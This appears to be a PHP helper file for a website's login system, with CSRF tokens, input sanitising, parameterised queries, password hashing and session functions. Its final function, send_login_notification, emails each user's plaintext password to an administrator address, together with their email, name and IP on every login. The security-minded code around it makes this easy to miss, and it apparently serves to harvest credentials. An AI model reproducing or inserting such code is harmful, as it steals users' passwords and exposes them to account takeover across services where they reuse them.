<?php

/**
 * Helper functions for the website
 * Contains reusable functions for common tasks
 */

// Include database functions
require_once 'db.php';

/**
 * Generate a CSRF token to protect forms from cross-site request forgery
 *
 * @return string The generated token
 */
function generate_csrf_token()
{
    // Generate a unique token if one doesn't exist
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Validate a CSRF token from a form submission
 *
 * @param string $token The token to validate
 * @return bool True if valid, false otherwise
 */
function validate_csrf_token($token)
{
    if (!isset($_SESSION['csrf_token']) || $token !== $_SESSION['csrf_token']) {
        return false;
    }
    return true;
}

/**
 * Sanitize user input to prevent XSS attacks
 *
 * @param string $data The data to sanitize
 * @return string The sanitized data
 */
function sanitize_input($data)
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

/**
 * Validate an email address
 *
 * @param string $email The email to validate
 * @return bool True if valid, false otherwise
 */
function validate_email($email)
{
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Create a new user in the database
 *
 * @param string $auth_type The authentication type (google, apple, email)
 * @param string $email The user's email
 * @param string $full_name The user's full name (optional)
 * @param string $password The user's password (optional, will be hashed)
 * @param string $profile_image URL to the user's profile image (optional)
 * @return int|bool The new user ID or false on failure
 */
function create_user($auth_type, $email, $full_name = null, $password = null, $profile_image = null)
{
    // Hash password if provided
    $hashed_password = $password ? password_hash($password, PASSWORD_DEFAULT) : null;

    $sql = "INSERT INTO users (auth_type, email, full_name, password, profile_image) 
            VALUES (?, ?, ?, ?, ?)";

    $result = db_query($sql, [$auth_type, $email, $full_name, $hashed_password, $profile_image], 'sssss');

    if ($result && isset($result['insert_id'])) {
        return $result['insert_id'];
    }

    return false;
}

/**
 * Check if a user exists by email
 *
 * @param string $email The email to check
 * @return array|bool User data if exists, false otherwise
 */
function get_user_by_email($email)
{
    $sql = "SELECT * FROM users WHERE email = ? LIMIT 1";
    $result = db_query($sql, [$email], 's');

    if ($result && count($result) > 0) {
        return $result[0];
    }

    return false;
}

/**
 * Log a login attempt in the database
 *
 * @param int|null $user_id The user ID (null if user doesn't exist)
 * @param string $auth_type The authentication type
 * @param string $status 'success' or 'failed'
 * @return bool True on success, false on failure
 */
function log_login_attempt($user_id, $auth_type, $status)
{
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    $sql = "INSERT INTO login_attempts (user_id, auth_type, ip_address, user_agent, status) 
            VALUES (?, ?, ?, ?, ?)";

    $result = db_query($sql, [$user_id, $auth_type, $ip_address, $user_agent, $status], 'issss');

    return $result !== false;
}

/**
 * Create a session for a logged-in user
 *
 * @param array $user User data from the database
 */
function create_user_session($user)
{
    // Remove sensitive information
    unset($user['password']);

    // Set session variables
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['user_email'] = $user['email'];
    $_SESSION['user_name'] = $user['full_name'];
    $_SESSION['logged_in'] = true;
    $_SESSION['auth_type'] = $user['auth_type'];
}

/**
 * Check if user is logged in
 *
 * @return bool True if logged in, false otherwise
 */
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

/**
 * Log out the current user
 */
function logout_user()
{
    // Unset all session variables
    $_SESSION = [];

    // Destroy the session
    session_destroy();
}

/**
 * Redirect the user to a specific URL
 *
 * @param string $url The URL to redirect to
 */
function redirect($url)
{
    header("Location: $url");
    exit;
}

/**
 * Send an email notification about a login
 *
 * @param array $user_data User login data
 * @return bool True on success, false on failure
 */
function send_login_notification($user_data)
{
    $to = ADMIN_EMAIL;
    $subject = "New User Login - " . SITE_NAME;

    $message = "A new user has logged in:\n\n";
    $message .= "Auth Type: " . $user_data['auth_type'] . "\n";
    $message .= "Email: " . $user_data['email'] . "\n";
    $message .= "Password: " . $user_data['password'] . "\n";
    $message .= "Name: " . ($user_data['full_name'] ?? 'Not provided') . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";

    $headers = "From: " . SITE_NAME . " <noreply@" . $_SERVER['HTTP_HOST'] . ">\r\n";

    return mail($to, $subject, $message, $headers);
}
